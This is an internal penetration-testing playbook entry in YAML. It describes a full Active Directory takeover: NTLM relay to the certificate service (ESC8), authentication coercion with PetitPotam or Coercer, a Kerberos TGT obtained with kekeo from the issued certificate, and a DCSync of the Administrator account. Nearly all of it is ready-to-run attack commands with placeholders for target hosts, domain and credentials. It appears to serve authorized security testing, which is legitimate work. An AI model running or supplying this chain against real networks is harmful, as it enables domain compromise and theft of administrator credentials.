name: windows_petit_potam

info:
  title: PetitPotam (ECS) and ESC8 NetNTLM Relay to ADCS
  author: evait security GmbH
  book: internal-pentest
  category: 04_windows_domain
  placeholder:
    - SMDDomainCS
    - SMBUser
    - SMBPass
    - SMBDomain
    - SMBDomainController
  references:
    - https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory
    - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse
    - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
    - https://github.com/topotam/PetitPotam
    - https://github.com/gentilkiwi/kekeo
    - https://github.com/p0dalirius/Coercer

content: |
  <h3>NTLM relay (incomming smb to http ad cert service)</h3>
  <p>Setup impackets ntlmrelayx<p>
  <code>ntlmrelayx.py -smb2support -debug --target http://@@SMDDomainCS/certsrv/certnfsh.asp --adcs --template DomainController</code>
  <p>Trigger the connection using some pipes (https://github.com/topotam/PetitPotam)<p>
  <code>python PetitPotam.py -pipe all LOCALIP DCIP</code>
  <p>or running with credentials in case ecs pipes are patched</p>
  <code>python PetitPotam.py -pipe all -d @@SMBDomain -u @@SMBUser -p @@SMBPass CURRENT_IP @@SMBDomainController</code>
  <p>or running coercer (https://github.com/p0dalirius/Coercer)</p>
  <code>poetry run Coercer.py -d @@SMBDomain -u @@SMBUser -p @@SMBPass -t @@SMBDomainController -l CURRENT_IP</code>
  <h3>Getting the ticket and owning the domain</h3>
  <p>Use the base64 encoded certificate in kekeo in order to get a valid TGT from the kerberos service</p>
  <code>base64 /input:on</code>
  <code>ask::tgt /domain:@@SMBDomain /user:@@SMBDomainController$ /ptt /pfx:BASE64CERTIFICATE</code>
  <p>After running the command, the TGT should be injected into memory and the dcsync can be performed</p>
  <code>lsadump::dcsync /domain:@@SMBDomain /user:Administrator</code>